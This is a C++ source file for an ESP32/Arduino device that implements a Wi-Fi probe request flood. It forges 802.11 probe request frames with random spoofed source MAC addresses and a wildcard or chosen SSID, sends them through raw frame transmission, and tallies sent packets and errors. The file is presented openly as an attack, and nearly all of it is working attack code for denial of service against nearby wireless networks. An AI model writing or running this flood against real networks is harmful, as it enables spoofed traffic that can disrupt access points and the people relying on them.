// probe_flood_attack.cpp
#include "probe_flood_attack.h"
#include "utilities.h" // For generateRandomMac, macToString
#include <Arduino.h>

// Definition of extern variables is expected in the main .ino file or a global context file.

void perform_sendProbeFlood() {
    probe_request_frame_s probe_pkt;
    memset(&probe_pkt, 0, sizeof(probe_request_frame_s));

    probe_pkt.hdr.frame_control = htons(0x4000); // Type: Management (00), Subtype: Probe Request (0100)
    probe_pkt.hdr.duration_id = 0;

    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(probe_pkt.hdr.addr1, broadcast_mac, 6); // DA = Broadcast
    generateRandomMac(probe_pkt.hdr.addr2);       // SA = Random MAC (Source Address)
    memcpy(probe_pkt.hdr.addr3, broadcast_mac, 6); // BSSID = Broadcast (for Probe Request)

    probe_pkt.hdr.seq_ctrl = 0;

    // Tag: SSID parameter set (ID: 0)
    probe_pkt.ssid_tag_id = 0x00;
    if (probeFloodDetailedStats.targetSSID.equalsIgnoreCase("Wildcard") || probeFloodDetailedStats.targetSSID.isEmpty()) {
        probe_pkt.ssid_tag_len = 0; // Wildcard SSID (empty)
    } else {
        probe_pkt.ssid_tag_len = probeFloodDetailedStats.targetSSID.length();
        if (probe_pkt.ssid_tag_len > 32) probe_pkt.ssid_tag_len = 32; // Ensure not to overflow
        strncpy(probe_pkt.ssid_data, probeFloodDetailedStats.targetSSID.c_str(), probe_pkt.ssid_tag_len);
        probe_pkt.ssid_data[probe_pkt.ssid_tag_len] = '\0'; // Ensure null termination if space allows (probe_pkt.ssid_data is char[33])
    }

    // Tag: Supported Rates (ID: 1)
    probe_pkt.rates_tag_id = 0x01;
    probe_pkt.rates_tag_len = 8;
    probe_pkt.rates_data[0] = 0x82; // 1 Mbps (B)
    probe_pkt.rates_data[1] = 0x84; // 2 Mbps (B)
    probe_pkt.rates_data[2] = 0x8B; // 5.5 Mbps (B)
    probe_pkt.rates_data[3] = 0x96; // 11 Mbps (B)
    probe_pkt.rates_data[4] = 0x0C; // 6 Mbps
    probe_pkt.rates_data[5] = 0x12; // 9 Mbps
    probe_pkt.rates_data[6] = 0x18; // 12 Mbps
    probe_pkt.rates_data[7] = 0x24; // 18 Mbps

    // Calculate total packet size
    size_t packet_size = sizeof(ieee80211_hdr) + 
                         2 + probe_pkt.ssid_tag_len +  // SSID Tag ID + Length + Data
                         2 + probe_pkt.rates_tag_len; // Rates Tag ID + Length + Data

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &probe_pkt, packet_size, false);

    if (err == ESP_OK) {
        probeFloodDetailedStats.packetsSent++;
        totalPacketsSentGlobal++;
    } else {
        probeFloodDetailedStats.errors++;
        Serial.printf("PROBE_FLOOD ОШИБКА отправки: %s (SSID: %s, SA: %s)\n", 
                      esp_err_to_name(err), 
                      (probe_pkt.ssid_tag_len == 0 ? "Wildcard" : probe_pkt.ssid_data), 
                      macToString(probe_pkt.hdr.addr2).c_str());
    }
}

